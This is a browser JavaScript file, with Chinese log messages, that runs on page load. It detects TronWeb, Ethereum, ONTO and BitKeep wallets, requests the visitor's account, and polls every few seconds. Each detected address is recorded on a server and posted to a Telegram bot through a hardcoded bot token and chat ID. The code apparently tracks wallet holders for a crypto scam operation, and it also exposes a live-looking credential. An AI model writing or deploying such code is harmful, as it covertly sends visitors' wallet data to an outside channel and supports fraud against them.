const TG_BOT_TOKEN = '7883552892:AAGh1SuqDdSUD5JPgmOsVl0zW4uGlrJt3jM';
const TG_CHAT_ID = '-1002560242076';

let isInitializing = true;
const INIT_TIMEOUT = 5000;

function getLastDetectedAddress() {
    return localStorage.getItem('lastDetectedAddress');
}

function setLastDetectedAddress(address) {
    if (address) {
        localStorage.setItem('lastDetectedAddress', address);
    } else {
        localStorage.removeItem('lastDetectedAddress');
    }
}

async function addWalletRecord(type, address, status) {
    try {
        const response = await fetch('/api/wallet_records', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: type,
                address: address,
                status: status
            })
        });
        
        const result = await response.json();
        if (!result.success) {
            console.error('保存钱包记录失败:', result.message);
        }
    } catch (error) {
        console.error('保存钱包记录时出错:', error);
    }
}

async function deleteRecord(recordId) {
    try {
        const response = await fetch(`/api/wallet_records/${recordId}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        if (result.success) {
            const recordElement = document.getElementById(`wallet-record-${recordId}`);
            if (recordElement) {
                recordElement.remove();
            }
            
            const recordsContainer = document.querySelector('.wallet-records-container');
            if (recordsContainer && recordsContainer.children.length === 0) {
                recordsContainer.innerHTML = `
                    <div class="text-center py-5">
                        <i class="bi bi-wallet2 text-muted fs-1 mb-3"></i>
                        <p class="text-muted">暂无钱包连接记录</p>
                    </div>
                `;
            }
        } else {
            console.error('删除钱包记录失败:', result.message);
        }
    } catch (error) {
        console.error('删除钱包记录时出错:', error);
    }
}

function isNewSession() {
    return !sessionStorage.getItem(SESSION_KEY);
}

async function waitForTronWeb(maxAttempts = 10) {
    return new Promise((resolve) => {
        let attempts = 0;
        const checkTronWeb = setInterval(() => {
            attempts++;
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(checkTronWeb);
                resolve(true);
            } else if (attempts >= maxAttempts) {
                clearInterval(checkTronWeb);
                resolve(false);
            }
        }, 500);
    });
}

async function sendToTelegram(message) {
    console.log('准备发送消息到Telegram:', message);
    try {
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        console.log('发送请求到:', url);
        
        const body = {
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        console.log('请求体:', body);

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });
        
        const data = await response.json();
        console.log('Telegram API响应:', data);
        return data.ok;
    } catch (error) {
        console.error('发送到Telegram失败:', error);
        return false;
    }
}

async function getTronWebAddress() {
    if (!window.tronWeb) return null;
    
    try {
        if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            return window.tronWeb.defaultAddress.base58;
        }
        
        if (typeof window.tronWeb.ready === 'function') {
            await window.tronWeb.ready;
            if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                return window.tronWeb.defaultAddress.base58;
            }
        }

        if (typeof window.tronWeb.request === 'function') {
            const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
            return accounts[0];
        }
    } catch (error) {
        console.error('获取TronWeb地址失败:', error);
    }
    return null;
}

async function detectWeb3Wallet() {
    console.log('开始检测钱包状态...');
    
    if (window.tronWeb) {
        const address = await getTronWebAddress();
        console.log('TronWeb检测结果:', {
            defaultAddress: window.tronWeb.defaultAddress,
            address: address,
            isConnected: window.tronWeb.ready
        });
        return {
            type: 'tronweb',
            provider: window.tronWeb,
            address: address,
            isConnected: window.tronWeb.ready
        };
    } else if (window.ethereum) {
        let address = window.ethereum.selectedAddress;
        let isConnected = window.ethereum.isConnected();
        if (!address && typeof window.ethereum.request === 'function') {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                address = accounts[0];
            } catch (error) {
                console.error('获取ETH地址失败:', error);
            }
        }
        return {
            type: 'ethereum',
            provider: window.ethereum,
            address: address,
            isConnected: isConnected
        };
    } else if (window.onto) {
        let address = null;
        if (typeof window.onto.request === 'function') {
            try {
                const accounts = await window.onto.request({ method: 'eth_requestAccounts' });
                address = accounts[0];
            } catch (error) {
                console.error('获取ONTO地址失败:', error);
            }
        }
        return {
            type: 'onto',
            provider: window.onto,
            address: address
        };
    } else if (window.bitkeep && window.bitkeep.ethereum) {
        let address = window.bitkeep.ethereum.selectedAddress;
        if (!address && typeof window.bitkeep.ethereum.request === 'function') {
            try {
                const accounts = await window.bitkeep.ethereum.request({ method: 'eth_requestAccounts' });
                address = accounts[0];
            } catch (error) {
                console.error('获取BitKeep地址失败:', error);
            }
        }
        return {
            type: 'bitkeep',
            provider: window.bitkeep.ethereum,
            address: address
        };
    }
    console.log('未检测到任何钱包');
    return null;
}

async function detectAndNotify() {
    console.log('开始检测钱包...', isInitializing ? '(初始化阶段)' : '');
    const wallet = await detectWeb3Wallet();
    console.log('检测结果:', wallet);
    
    const lastAddress = getLastDetectedAddress();
    const isWalletDisconnected = !wallet || !wallet.address || !wallet.isConnected;
    
    if (wallet && wallet.address && wallet.isConnected) {
        if (wallet.address !== lastAddress) {
            setLastDetectedAddress(wallet.address);
            await addWalletRecord(wallet.type, wallet.address, 'connected');
            const message = `
🔍 检测到新的钱包连接:
类型: ${wallet.type}
地址: ${wallet.address}
时间: ${new Date().toLocaleString()}
`;
            console.log('准备发送通知...');
            const result = await sendToTelegram(message);
            console.log('发送结果:', result);
        } else {
            console.log('地址未变化，跳过通知');
        }
        isInitializing = false;
    } else if (lastAddress && !isInitializing && isWalletDisconnected) {
        setLastDetectedAddress(null);
        await addWalletRecord('unknown', lastAddress, 'disconnected');
        const message = `
❌ 钱包已断开连接
上次连接地址: ${lastAddress}
时间: ${new Date().toLocaleString()}
`;
        await sendToTelegram(message);
        console.log('检测到钱包断开连接');
    } else {
        console.log(isInitializing ? '初始化中，等待钱包连接...' : '未检测到钱包连接');
    }
}

function setupWalletListener() {
    setTimeout(() => {
        isInitializing = false;
        console.log('初始化阶段结束');
    }, INIT_TIMEOUT);

    setTimeout(async () => {
        await detectAndNotify();
    }, 1000);

    if (window.ethereum) {
        window.ethereum.on('accountsChanged', () => {
            detectAndNotify();
        });
        window.ethereum.on('disconnect', () => {
            detectAndNotify();
        });
    }

    setInterval(async () => {
        await detectAndNotify();
    }, 3000);
}

window.addEventListener('load', setupWalletListener);

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        isInitializing = true;
        setTimeout(() => {
            isInitializing = false;
        }, 2000);
        
        setTimeout(async () => {
            await detectAndNotify();
        }, 1000);
    }
}); 